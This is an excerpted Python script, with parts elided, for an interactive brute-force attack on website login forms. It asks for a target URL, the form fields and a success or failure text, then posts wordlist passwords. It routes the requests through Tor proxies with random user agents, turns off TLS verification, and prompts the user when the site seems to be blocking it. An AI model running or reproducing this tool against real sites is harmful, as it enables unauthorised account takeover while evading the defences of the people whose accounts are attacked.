...
if len(sys.argv) == 2:
    if sys.argv[1] == '--debug' or sys.argv[1] == '-d':
        logging.basicConfig(level=logging.DEBUG,
                            format=f'[{colorama.Fore.MAGENTA + colorama.Style.BRIGHT}%(funcName)s %(levelname)s{colorama.Fore.RESET + colorama.Style.RESET_ALL + colorama.Back.RESET}] [%(asctime)s, %(lineno)d] %(message)s')
...
while RUNNING:
    ...
    indicator: str = questionary.text(
        'A text in the website that indicates a successful / unsuccessful attempt, For example uIncorrect / sCorrect: ').ask()

    if not indicator.startswith('u') and not indicator.startswith('s'):
        logging.error(
            RED + BRIGHT + 'Indicator must start with an s for messages that appear when successful and u for messages that appear when unsuccessful' + RESET)
        continue

    url: str = questionary.text('The URL of the form you wish to attack: ').ask()

    fields = questionary.text(
        'The field(s) that are required to form the request with their value separated by column (:), if more than one please separate them by a comma if none press enter (without the one that is going to be attacked): ').ask()
    ...
    try:
        rand_fields = fields_dictionary
        rand_fields[field_to_attack] = passwords[random.randint(0, len(passwords) - 1)]
        logging.debug(f'Checking connection with the random fields {rand_fields}')

        if tor:
            response = requests.post(url, data=rand_fields, timeout=10,
                                     headers=get_header_with_random_user_agent(), verify=False,
                                     proxies={'http': f'socks5h://127.0.0.1:{tor_ports[0]}',
                                              'https': f'socks5h://127.0.0.1:{tor_ports[0]}'})
        ...
        if indicator.startswith('u') and indicator.replace('u', '') not in response.text:
            ...
            if bool(questionary.confirm(
                    f'The website returned a non-valid status code "{response.status_code}" which if you are using TOR could mean that the website is blocking your requests or that the website is down, do you wish to continue anyway?').ask()):
                pass
            else:
                RUNNING = 0
                break
    ...
    logging.debug('Deleting random fields')
    del rand_fields
